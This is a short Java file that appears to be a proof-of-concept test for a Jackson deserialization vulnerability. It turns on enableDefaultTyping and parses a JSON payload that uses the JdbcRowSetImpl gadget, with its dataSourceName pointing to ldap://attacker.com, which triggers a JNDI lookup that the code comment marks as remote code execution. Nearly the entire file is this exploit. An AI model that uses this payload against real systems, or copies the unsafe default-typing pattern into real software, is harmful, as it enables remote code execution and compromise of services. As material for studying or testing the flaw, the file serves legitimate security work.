// test_jackson_vuln.java
import com.fasterxml.jackson.databind.ObjectMapper;

public class JacksonVuln {
    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        String json = "[\"com.sun.rowset.JdbcRowSetImpl\", {\"dataSourceName\":\"ldap://attacker.com\", \"autoCommit\":true}]";
        Object obj = mapper.enableDefaultTyping().readValue(json, Object.class);  // RCE
    }
}
